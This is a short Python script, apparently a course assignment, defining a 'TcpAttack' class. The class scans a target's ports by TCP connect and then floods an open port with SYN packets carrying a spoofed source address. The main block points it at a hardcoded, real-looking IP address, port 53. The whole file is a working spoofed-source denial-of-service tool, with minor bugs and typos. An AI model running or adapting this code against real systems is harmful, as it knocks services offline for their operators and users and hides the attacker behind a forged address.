#!/usr/bin/env python

from scapy.all import *
import socket as socket


class TcpAttack:

    def __init__(self,spoofIP,targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarge(self,rangeStart,rangeEnd):
        """This method will scan the target computer for open ports and return all ports found into openports.txt"""
        port_to_write = ""#this will contain ready to write string

        for port in range(rangeStart,rangeEnd+1):
            try:
                #initilize the socket
                socket_connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # those are specified by default
                socket_connect.settimeout(0.1)  # as recommended by lecture notes
                socket_connect.connect((self.targetIP,port))
                port_to_write = port_to_write + str(port) + "\n"
                #print("Port {} open".format(port))
            except:
                pass
                print("Port {} looks like it is closed".format(port))

        with open("openpowrts.txt", "w") as file:
            file.write(port_to_write)


    def attackTarget(self,port):
        """Checks if the port is open and performs a Dos using the port.
        If port open attack with Dos and return 1
        if port closed return 0
        Look section 16.15"""

        try:
            socket_check_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket_check_connection.settimeout(0.1)
            socket_check_connection.connect((self.targetIP,port))
            for i in range(100):
                ipHeader = scapy.all.IP(src = self.spoofIP, dst = self.targetIP)
                tcpHeader = scapy.all.TCP(flags="S", sport=scapy.all.RandShort(), dport=port)
                scapy.all.send(ipHeader/tcpHeader)
            return 1
        except Exception as e:
            print("Error has been detected")
            print("{}".format(e))
            return 0
        pass


if __name__ == "__main__":
    DOSattack = TcpAttack("123.123.213.213","199.168.74.118")
    DOSattack.scanTarge(1,100)
    DOSattack.attackTarget(53)